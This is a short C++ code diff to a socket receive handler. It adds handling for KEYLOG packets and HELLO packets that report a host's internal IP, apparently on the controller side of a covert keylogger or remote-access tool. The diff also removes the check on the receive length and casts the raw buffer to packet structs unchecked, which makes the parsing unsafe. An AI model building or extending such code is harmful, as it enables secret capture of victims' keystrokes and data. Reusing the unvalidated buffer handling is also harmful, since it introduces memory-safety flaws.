@@ -15,16 +15,23 @@ void CClientSocket::OnReceive(int nErrorCode)
 
 	char buff[300];
 	int len = Receive(buff, 300, 0);
-	if (len < 0)
-	{
-		return;
-	}
+
+	PDUHello* pdu_hello;
+	PDUKeylog* pdu_keylog;
+	CString format;
+
 	switch (buff[0])
 	{
 	case HELLO :
-		PDUHello* pdu = (PDUHello*)buff;
-		CString format(pdu->internal_ip);
+		pdu_hello = (PDUHello*)buff;
+		format = pdu_hello->internal_ip;
 		main_dlg->SetInvisibleInfo(this, format);
+		break;
+
+	case KEYLOG :
+		pdu_keylog = (PDUKeylog*)buff;
+		main_dlg->ReceiveKeylog(this, pdu_keylog);
+		break;
 	}
 	CSocket::OnReceive(nErrorCode);
 }
